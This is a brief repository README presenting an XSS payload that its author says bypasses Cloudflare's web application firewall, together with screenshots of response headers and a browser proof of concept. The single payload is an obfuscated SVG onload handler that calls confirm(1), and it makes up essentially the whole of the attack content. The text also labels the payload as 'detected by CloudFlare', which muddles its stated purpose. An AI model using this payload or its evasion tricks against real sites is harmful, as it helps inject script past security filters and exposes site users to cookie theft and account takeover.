# Payloads-XSS-Bypass-WAF-CloudFlare

This repository will leave a zero-day XSS evaluated by me, to bypass the WAF Cloudflare.

Simple payload detected by CloudFlare:

![image](https://user-images.githubusercontent.com/66162160/184783085-5935835f-9da7-4192-914e-9215c0260b0a.png)


Simple payload detected by CloudFlare:


```sh
"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
```

# Verificate response header:

![image](https://user-images.githubusercontent.com/66162160/184783183-0c1e21b5-68a8-4211-99d9-c1c66c498367.png)


#PoC Browser:

![image](https://user-images.githubusercontent.com/66162160/184782966-33c94d6e-17b0-43a3-ba7f-09b3bb6b1b27.png)
